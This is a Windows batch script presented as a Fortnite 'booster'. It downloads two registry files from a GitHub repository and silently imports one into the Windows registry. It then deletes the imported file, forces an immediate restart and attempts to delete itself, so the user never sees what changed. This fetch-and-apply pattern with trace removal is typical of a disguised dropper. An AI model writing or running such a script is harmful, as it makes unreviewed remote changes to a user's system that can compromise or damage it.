%echo off
powershell /c wget https://raw.githubusercontent.com/harryaldwithjarryald/ProjectCMD/main/fortnite_execute.reg -OutFile execute_Fortnite.reg
powershell /c wget https://raw.githubusercontent.com/harryaldwithjarryald/ProjectCMD/main/booster.reg -OutFile booster_Fortnite.reg
echo NOTE:  Everytime you restart your computer in the cmd window, you will need to redo this.
echo In order to bypass this limitation, move the file "booster_Fortnite.reg" found in the folder you ran this from, to the root directory of your C:\ drive.
echo Then, once on the cmd window type "C:\booster_Fortnite.reg"
execute_Fortnite.reg
del execute_Fortnite.reg
shutdown -r -t 1
del fortnite_temp.bat
